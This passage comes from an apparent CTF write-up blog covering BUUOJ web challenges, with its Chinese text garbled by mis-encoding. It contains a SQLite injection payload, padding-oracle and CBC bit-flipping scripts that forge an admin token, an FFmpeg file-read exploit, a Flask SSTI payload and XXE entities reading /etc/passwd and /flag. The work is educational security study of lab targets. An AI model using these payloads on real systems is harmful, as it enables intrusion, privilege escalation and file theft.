class="string">"CREATE TABLE &#123;$table_name&#125; ("</span>;</span><br><span class="line">  $sql .= <span class="string">"dummy1 TEXT, dummy2 TEXT"</span>;</span><br><span class="line">  <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($columns); $i++) &#123;</span><br><span class="line">    $column = (string) ($columns[$i][<span class="string">'name'</span>] ?? <span class="string">''</span>);</span><br><span class="line">    $type = (string) ($columns[$i][<span class="string">'type'</span>] ?? <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_valid($column) || !is_valid($type)) &#123;</span><br><span class="line">      flash(<span class="string">'Column name or type contains dangerous characters.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strlen($column) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen($column) || strlen($type) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen($type)) &#123;</span><br><span class="line">      flash(<span class="string">'Column name and type must be 1-32 characters.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sql .= <span class="string">', '</span>;</span><br><span class="line">    $sql .= <span class="string">"`$column` $type"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $sql .= <span class="string">');'</span>;</span><br><span class="line"></span><br><span class="line">  $pdo-&gt;query(<span class="string">'CREATE TABLE `'</span> . FLAG_TABLE . <span class="string">'` (`'</span> . FLAG_COLUMN . <span class="string">'` TEXT);'</span>);</span><br><span class="line">  $pdo-&gt;query(<span class="string">'INSERT INTO `'</span> . FLAG_TABLE . <span class="string">'` VALUES ("'</span> . FLAG . <span class="string">'");'</span>);</span><br><span class="line">  $pdo-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">  $_SESSION[<span class="string">'database'</span>] = $filename;</span><br><span class="line">  redirect(<span class="string">'?page=index'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å»æ‰äº†éƒ¨åˆ†æ²¡æœ‰ç”¨çš„ä»£ç ï¼Œä¸‹é¢å°±æ¥çœ‹çœ‹æºç </p>
<p>æ³¨æ„åˆ°sqlæ‹¼æ¥åˆ›å»ºè¡¨çš„è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#123;$table_name&#125; (dummy1 TEXT, dummy2 TEXT</span><br></pre></td></tr></table></figure>

<p>googleä¸€ä¸‹å‘ç°æ˜¯SQLite</p>
<p>æœ‰å…³äºSQLiteä¸‰ä¸ªçŸ¥è¯†ç‚¹</p>
<p>ç¬¬ä¸€ä¸ªï¼šæˆ‘ä»¬åœ¨ä½¿ç”¨sqliteè¯­æ³•çš„æ—¶å€™åˆ—åæ˜¯å¯ä»¥åŠ æ–¹æ‹¬å·çš„ï¼Œæ˜¯ä¸ºäº†å’Œmysqlè¯­æ³•å…¼å®¹ã€‚ä¾‹å¦‚ï¼šselect [sql] from sqlite_master;</p>
<p>ç¬¬äºŒä¸ªï¼šæˆ‘ä»¬åœ¨ä½¿ç”¨sqlite_masteræ—¶ä½¿ç”¨é”™è¯¯çš„è¯­æ³•ï¼Œsqliteå°†ä¼šå¿½ç•¥åé¢åˆ—çš„åç§°ï¼Œæ— è®ºåˆ—çš„åç§°æ˜¯å¦çœŸå®çš„å­˜åœ¨ï¼Œé™¤éåœ¨åˆ—ä¹‹é—´æ”¾ç½®</p>
<p>ç¬¬ä¸‰ä¸ªï¼šæˆ‘ä»¬åœ¨ä½¿ç”¨sqliteè¯­æ³•æ—¶ï¼Œç”¨è¯¥è¯­å¥create table ..as select ..åˆ›å»ºè¡¨æ—¶å¯ä»¥ä¸ç”¨å¸¦æ‹¬å·</p>
<p>æ¯ä¸ªsqliteéƒ½æœ‰ä¸€ä¸ªè‡ªåŠ¨åˆ›å»ºçš„åº“sqlite_masterï¼Œé‡Œé¢ä¿å­˜äº†æ‰€æœ‰è¡¨åä»¥åŠåˆ›å»ºè¡¨æ—¶çš„createè¯­å¥ï¼Œå¯ä»¥ä»ä¸­è·å–flagçš„è¡¨åå’Œå­—æ®µå</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">table_name&#x3D;[aaa]as select [sql][&amp;columns[0][name]&#x3D;]from sqlite_master;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure>

<p>ç­‰ä»·äº</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table [aaa] as select sql from sqlite_master</span><br><span class="line">æŸ¥æ‰¾sqlite_masterä¸­sqlåˆ—çš„å€¼æ”¾å…¥aaaè¡¨ä¸­</span><br></pre></td></tr></table></figure>

<img src="/2020/07/11/vacation2/9.png" class="">

<p>æŸ¥åˆ°äº†è¡¨åå’Œåˆ—åï¼Œç»§ç»­æŸ¥</p>
<img src="/2020/07/11/vacation2/10.png" class="">

<h2 id="CISCN2019-ä¸œåŒ—èµ›åŒº-Day2-Web3-Point-System"><a href="#CISCN2019-ä¸œåŒ—èµ›åŒº-Day2-Web3-Point-System" class="headerlink" title="[CISCN2019 ä¸œåŒ—èµ›åŒº Day2 Web3]Point System"></a>[CISCN2019 ä¸œåŒ—èµ›åŒº Day2 Web3]Point System</h2><p>å¼€é¢˜ï¼Œæ‰«ç›®å½•</p>
<img src="/2020/07/11/vacation2/11.png" class="">

<p>è®¿é—®å¾—åˆ°çš„è·¯å¾„ï¼Œæ˜¯ä¸€ä¸ªå‰ç«¯APIç•Œé¢</p>
<img src="/2020/07/11/vacation2/12.png" class="">

<p>è¿™é‡Œçš„æ³¨å†Œä¸èƒ½ç›´æ¥ç”¨ï¼Œç”¨postman</p>
<img src="/2020/07/11/vacation2/13.png" class="">

<p>ç”¨è¿™ä¸ªè´¦å·ç™»å½•ï¼Œå‘ç°æƒé™ä¸å¤Ÿï¼Œçœ‹äº†ä¸€ä¸‹æ•°æ®ä¼ è¾“è¿‡ç¨‹</p>
<img src="/2020/07/11/vacation2/14.png" class="">

<p>tokenå¥½åƒæ˜¯base64ï¼Œè§£å¯†ä¹‹å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;signed_key&quot;:&quot;SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98&#x2F;+1ZXvkP16YkJhBIHoJvCOJAsEgoP7x8E2FffKsH8ZXENQPt6&#x2F;XN7MTw3QO+6mlQ23ZOIdF817b59sxTzBNDzELdMA&#x3D;&#x3D;&quot;,&quot;role&quot;:3,&quot;user_id&quot;:1,&quot;payload&quot;:&quot;2xCDATnZ9AxdNyuipTgPLMTtIRwX6eDj&quot;,&quot;expire_in&quot;:1596028630&#125;</span><br></pre></td></tr></table></figure>

<p>signed_keyç»§ç»­è§£å¯†ï¼Œå‘ç°ä¹±ç ï¼Œä¸‹é¢æ˜¯çœ‹çš„èµµå¸ˆå‚…çš„blogåšçš„</p>
<p>.å‰ä¸ºæ˜æ–‡åä¸ºä¹±ç ï¼Œæ¨æµ‹å‰ä¸º IV åä¸ºåŠ å¯†åçš„å¯†æ–‡ï¼Œæ¨æµ‹å…¶ä¸º AES CBC åŠ å¯†</p>
<p>å€Ÿç”¨èµµå¸ˆå‚…çš„åŠ å¯†ï¼Œä¼ªé€ è„šæœ¬ï¼Œè¿™é‡Œå› ä¸ºä¸ªäººåŸå› æ²¡è·‘æˆåŠŸï¼Œå°±åªè®°ä¸‹æ€è·¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">host = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">8233</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i]) ^ ord(b[i % len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padoracle</span><span class="params">(key)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    signed_key_decoed = base64.b64decode(signed_key)</span><br><span class="line">    url = <span class="string">"http://"</span> + host + <span class="string">":"</span> + str(port) + <span class="string">"/frontend/api/v1/user/info"</span></span><br><span class="line">    N = <span class="number">16</span></span><br><span class="line">    total_plain = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> range(<span class="number">0</span>, int(len(signed_key) / <span class="number">16</span>) - <span class="number">3</span>):</span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line">        get = <span class="string">""</span></span><br><span class="line">        cipher = signed_key_decoed[<span class="number">16</span> + block * <span class="number">16</span>:<span class="number">32</span> + block * <span class="number">16</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">                token = signed_key_decoed[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>]</span><br><span class="line">                padding = xor(get, chr(i) * (i - <span class="number">1</span>))</span><br><span class="line">                c = (chr(<span class="number">0</span>) * (<span class="number">16</span> - i)) + chr(j) + padding + cipher</span><br><span class="line">                token = base64.b64encode(token + c)</span><br><span class="line">                user_key_json_decode[<span class="string">'signed_key'</span>] = token</span><br><span class="line">                header = &#123;<span class="string">'Key'</span>: base64.b64encode(json.dumps(user_key_json_decode))&#125;</span><br><span class="line">                res = requests.get(url, headers=header)</span><br><span class="line">                <span class="keyword">if</span> res.json()[<span class="string">'code'</span>] != <span class="number">205</span>:</span><br><span class="line">                    get = chr(j ^ i) + get</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        plain = xor(get, signed_key_decoed[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>])</span><br><span class="line">        total_plain += plain</span><br><span class="line">    <span class="keyword">return</span> total_plain</span><br><span class="line">plain_text = padoracle(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVRm1zclQ3a2FGM1FXL29vWDdVcVRpZ215TVl5MFFZK1RlSzMya3hGZW94ay9ZNnkzaG0vaEJXK2lMaXVLdnNNS1NPK1ZQQ0pGSTdPbHJTL0dsYThWWmh1Y3p2NSs4djNXckNJSE5TbVJOS2xBRjREdlI2bDBSbFVaajB6WjgzWGlBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoid2x1NUUwN1piR3pUNDVRUEhORzVReUpQT2UyNjUwalgiLCJleHBpcmVfaW4iOjE1NTY4NTM2Mzh9"</span>)</span><br><span class="line">print(plain_text)</span><br></pre></td></tr></table></figure>

<p>ä¼ªé€ </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">host = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">8233</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_attack</span><span class="params">(key, block, origin_content, target_content)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    cipher_o = base64.b64decode(signed_key)</span><br><span class="line">    <span class="keyword">if</span> block &gt; <span class="number">0</span>:</span><br><span class="line">        iv_prefix = cipher_o[:block * <span class="number">16</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        iv_prefix = <span class="string">''</span></span><br><span class="line">    iv = cipher_o[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>]</span><br><span class="line">    cipher = cipher_o[<span class="number">16</span> + block * <span class="number">16</span>:]</span><br><span class="line">    iv_array = bytearray(iv)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])</span><br><span class="line">    iv = bytes(iv_array)</span><br><span class="line">    user_key_json_decode[<span class="string">'signed_key'</span>] = base64.b64encode(iv_prefix + iv + cipher)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(json.dumps(user_key_json_decode))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_info</span><span class="params">(key)</span>:</span></span><br><span class="line">    r = requests.post(<span class="string">"http://"</span> + host + <span class="string">":"</span> + str(port) + <span class="string">"/frontend/api/v1/user/info"</span>, headers = &#123;<span class="string">"Key"</span>: key&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"è·å–æˆåŠŸï¼"</span>)</span><br><span class="line">    <span class="keyword">return</span> r.json()[<span class="string">'data'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_role_palin</span><span class="params">(key, role)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(user_key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    user_key_json_decode[<span class="string">'role'</span>] = role</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(json.dumps(user_key_json_decode))</span><br><span class="line">print(<span class="string">"ç¿»è½¬ Key:"</span>)</span><br><span class="line">user_key = cbc_attack(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVRm1zclQ3a2FGM1FXL29vWDdVcVRpZ215TVl5MFFZK1RlSzMya3hGZW94ay9ZNnkzaG0vaEJXK2lMaXVLdnNNS1NPK1ZQQ0pGSTdPbHJTL0dsYThWWmh1Y3p2NSs4djNXckNJSE5TbVJOS2xBRjREdlI2bDBSbFVaajB6WjgzWGlBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoid2x1NUUwN1piR3pUNDVRUEhORzVReUpQT2UyNjUwalgiLCJleHBpcmVfaW4iOjE1NTY4NTM2Mzh9"</span>, <span class="number">0</span>, <span class="string">'&#123;"role":3,"user_'</span>, <span class="string">'&#123;"role":1,"user_'</span>)</span><br><span class="line">user_key = modify_role_palin(user_key, <span class="number">1</span>)</span><br><span class="line">print(user_key)</span><br><span class="line">print(<span class="string">"æµ‹è¯•æ‹‰å–ç”¨æˆ·ä¿¡æ¯ï¼š"</span>)</span><br><span class="line">user_info = get_user_info(user_key)</span><br><span class="line">print(user_info)</span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢ä¸€ä¸‹cookieå°±èƒ½æˆåŠŸç™»å½•(åšé¢œæ— è€»ç›—ç”¨ä¸€ä¸‹èµµæ€»çš„å›¾)</p>
<img src="/2020/07/11/vacation2/15.png" class="">

<p>åœ¨æ–‡ä»¶ä¸Šä¼ å¤„å¯ä»¥ä¸Šä¼ è§†é¢‘ï¼Œç»è¿‡å¤šæ¬¡ä¸Šä¼ ä¸‹è½½æ¯”å¯¹MD5å€¼ï¼Œæ¨æµ‹å…¶åç«¯åˆ©ç”¨äº† FFMpeg å¯¹è§†é¢‘æ–‡ä»¶åšå¤„ç†ï¼Œé‚£ä¹ˆå°±å°è¯•åˆ©ç”¨ FFMpeg çš„æ¼æ´æ¥è¯»å–æ–‡ä»¶ï¼Œ <a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 gen_xbin_avi.py file:&#x2F;&#x2F;&#x2F;flag test.avi</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä¸Šä¼ ï¼Œå†ä¸‹è½½è§†é¢‘ï¼Œåœ¨è§†é¢‘çš„ç¬¬ä¸€å¸§é‡Œå°±èƒ½çœ‹åˆ°flagäº†</p>
<h2 id="Windows-HITCON-2019-Buggy-Net"><a href="#Windows-HITCON-2019-Buggy-Net" class="headerlink" title="[Windows][HITCON 2019]Buggy_Net"></a>[Windows][HITCON 2019]Buggy_Net</h2><p>ç»™äº†æºç ï¼Œé‡ç‚¹å°±ä¸€ç‚¹ç‚¹</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bool isBad = <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> ( Request.Form[<span class="string">"filename"</span>] != <span class="literal">null</span> ) &#123;</span><br><span class="line">           isBad = Request.Form[<span class="string">"filename"</span>].Contains(<span class="string">".."</span>) == <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">       </span><br><span class="line">   &#125; </span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (!isBad) &#123;</span><br><span class="line">           Response.Write(System.IO.File.ReadAllText(@<span class="string">"C:\inetpub\wwwroot\" + Request.Form["</span>filename<span class="string">"]));</span></span><br><span class="line"><span class="string">       &#125;</span></span><br><span class="line"><span class="string">   &#125; catch (Exception ex) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   &#125;</span></span><br></pre></td></tr></table></figure>

<p>è¦æƒ³è¯»å–åˆ°flagï¼Œå°±è¦è®©!isBadä¸ºçœŸï¼Œæ ¹æ®ä»£ç ä¹Ÿå°±æ˜¯è¦ç¬¬ä¸€ä¸ªå¼‚å¸¸å¤„ç†èƒ½å¤ŸæˆåŠŸè§¦å‘ï¼Œå°±ä¸ä¼šé‡æ–°å¯¹isBadé‡æ–°èµ‹å€¼ä¸ºtrue</p>
<p>æ‰¾èµ„æ–™è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯aspï¼Œ<a href="https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/" target="_blank" rel="noopener">https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/</a></p>
<p>æ ¹æ®è¿™ç¯‡æ–‡ç« é‡Œçš„å†…å®¹ï¼ŒSending payload in the POST body using GETï¼Œå°±èƒ½å¤Ÿè§¦å‘è½½è·</p>
<img src="/2020/07/11/vacation2/16.png" class="">

<h2 id="b01lers2020-Scrambled"><a href="#b01lers2020-Scrambled" class="headerlink" title="[b01lers2020]Scrambled"></a>[b01lers2020]Scrambled</h2><p>è€ƒå¯Ÿç‚¹åœ¨cookieä¸­çš„transmissionså­—æ®µï¼Œå»é™¤æ‰å¼€å¤´å’Œç»“å°¾çš„kxkxkxkxshï¼Œä¸­é—´å‰©ä¸‹çš„å­—ç¬¦å’Œflagæœ‰å…³</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line">url=<span class="string">'http://7d447401-fe52-488f-b019-94ae1bc70742.node3.buuoj.cn/'</span></span><br><span class="line">r=requests.session()</span><br><span class="line">cookie=r.get(url).cookies</span><br><span class="line">data=[<span class="number">0</span>]*<span class="number">100</span></span><br><span class="line">print(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">    cookie=r.get(url).cookies</span><br><span class="line">    key=unquote(requests.utils.dict_from_cookiejar(cookie)[<span class="string">'transmissions'</span>].replace(<span class="string">'kxkxkxkxsh'</span>,<span class="string">''</span>))[<span class="number">2</span>:]</span><br><span class="line">    print(key)</span><br><span class="line">    value=unquote(requests.utils.dict_from_cookiejar(cookie)[<span class="string">'transmissions'</span>].replace(<span class="string">'kxkxkxkxsh'</span>,<span class="string">''</span>))[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">    print(value)</span><br><span class="line">    data[int(key)]=value</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    print(i,end=<span class="string">''</span>)</span><br><span class="line">   <span class="comment">#flag&#123;874a0593-7672-45f5-897c-7a2803df653800000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯¹flagè¿›è¡Œä¸€ä¸‹å¤„ç†ï¼Œ<code>flag{874a0593-7672-45f5-897c-7a2803df6538}</code></p>
<h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>å¼€é¢˜ï¼Œæ ¹æ®é¢˜ç›®æ˜¯flask_sstiç›´æ¥ç”¨python çš„æ¨¡æ¿æ³¨å…¥è¿›è¡Œæµ‹è¯•</p>
<img src="/2020/07/11/vacation2/17.png" class="">

<p>å…ˆçœ‹ä¸€ä¸‹config</p>
<img src="/2020/07/11/vacation2/18.png" class="">

<p>çœ‹åˆ°åé¢æœ‰åŠ å¯†åçš„flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#39;: &#39;-M7\x10w\x120kc\x03q7x\x0eG_o\x01(DL\x1c\x0b\x17&#123;o\x01i\x02\x0fAY&quot;\x01\x7f+\x12&gt;B]NG</span><br></pre></td></tr></table></figure>

<p>è§£å¯†åº”è¯¥å°±èƒ½æ‹¿åˆ°flagäº†ï¼Œå› ä¸ºæ˜¯å¼‚æˆ–è¿ç®—ï¼ŒåŠ å¯†è„šæœ¬å’Œè§£å¯†è„šæœ¬å°±æ˜¯åŒä¸€ä¸ªï¼Œé¢˜ç›®æè¿°ä¸­å·²ç»ç»™å‡ºäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(line, key, key2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(chr(x ^ ord(line[x]) ^ ord(key[::<span class="number">-1</span>][x]) ^ ord(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> range(len(line)))</span><br><span class="line">t = <span class="string">'-M7\x10w\x120kc\x03q7x\x0eG_o\x01(DL\x1c\x0b\x17&#123;o\x01i\x02\x0fAY"\x01\x7f+\x12&gt;B]NG'</span></span><br><span class="line">s = encode(t, <span class="string">'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3'</span>, <span class="string">'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT'</span>)</span><br><span class="line">print(s)</span><br><span class="line"><span class="comment">#flag&#123;c2e13cd3-8d56-4d65-bda9-c7173d56fdba&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€ç§åšæ³•æ˜¯ç”¨flaskçš„åŸºç±»å’Œå¯¹è±¡è¿›è¡Œè¯»å–ï¼Œé™„ä¸Šwp<a href="https://guokeya.github.io/post/zIiwsY95N/" target="_blank" rel="noopener">https://guokeya.github.io/post/zIiwsY95N/</a></p>
<p>è¿™å¼ å›¾å€Ÿç”¨ä¸çŸ¥åå¸ˆå‚…çš„ï¼Œæ›´æ¸…æ¥šäº›</p>
<img src="/2020/07/11/vacation2/20.png" class="">

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[&quot;\x5F\x5Fclass\x5F\x5F&quot;][&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](0, &quot;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/11/vacation2/19.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>xxeChallenge</title>
    <url>/2020/06/02/xxeChallenge/</url>
    <content><![CDATA[<p>å‰è¿°ï¼šxxeå›½å†…é¢˜ç›®è¾ƒå°‘ï¼Œæ€»ç»“åœ¨ä¸€èµ·ï¼Œæ–¹ä¾¿å›é¡¾<a id="more"></a></p>
<h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>å¼€é¢˜æ˜¯ä¸ªç™»å½•æ¡†ï¼Œé¢˜ç›®è¯´äº†æ˜¯xmlçš„é¢˜ï¼Œç›´æ¥æƒ³åˆ°xxeï¼Œä¸ç”¨å°è¯•sqlæ³¨å…¥äº†</p>
<p>ç”¨burpæŠ“åŒ…ç™»å½•ï¼Œå¯ä»¥çœ‹åˆ°æŠ“åˆ°çš„æ•°æ®å°±æ˜¯xxeçš„æ ¼å¼ï¼Œå°è¯•å¤–éƒ¨å®ä½“æ³¨å…¥è¯»å–/etc/passwdï¼ŒæˆåŠŸ,æ²¡å•¥ä¸œè¥¿ï¼Œæ¥çœ‹çœ‹/etc/hosts,å‘ç°å­˜æ´»ä¸»æœº</p>
<img src="/2020/06/02/xxeChallenge/1.png" class="">

<p>é‚£å°±ç›´æ¥httpè®¿é—®ä¸»æœºï¼Œç»“æœå¦‚ä¸‹</p>
<img src="/2020/06/02/xxeChallenge/2.png" class="">

<p>æŠ¥é”™äº†ï¼Œé‚£å°±æ˜¯æ²¡æœ‰è¿™å°ä¸»æœºï¼Œå…¶ä»–å¸ˆå‚…è¯´è¿™æ˜¯è¦æ‰“å†…ç½‘çš„ä¸»æœºï¼Œéœ€è¦è·‘è„šæœ¬ï¼Œä½†æ˜¯è¿™é¢˜å¥½åƒåä¸€ä¸ªåœ°å€å°±æ˜¯äº†ï¼Œé‚£å°±è¯•è¯•</p>
<img src="/2020/06/02/xxeChallenge/3.png" class="">

<p>å¯ä»¥çœ‹åˆ°è¯»åˆ°äº†flagï¼Œè¿™é‡Œå†…ç½‘ä¸»æœºå¯ä»¥ç”¨burpçˆ†ç ´ï¼Œè„šæœ¬æš‚æ—¶æ²¡æ‰¾åˆ°</p>
<h3 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h3><p>æ–‡ä»¶ä¸Šä¼ ï¼Œåœ¨aboutå¤„å¾—çŸ¥flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œåœ¨uploadå¤„æœ‰ä¸ªæç¤ºï¼Œæ˜¯xmlçš„æ ¼å¼</p>
<img src="/2020/06/02/xxeChallenge/4.png" class="">

<p>çœ‹åˆ°è¿™ä¸ªï¼Œåº”è¯¥å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªxml çš„æ–‡ä»¶æ¥æ‰“äº†</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">users</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span>  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>

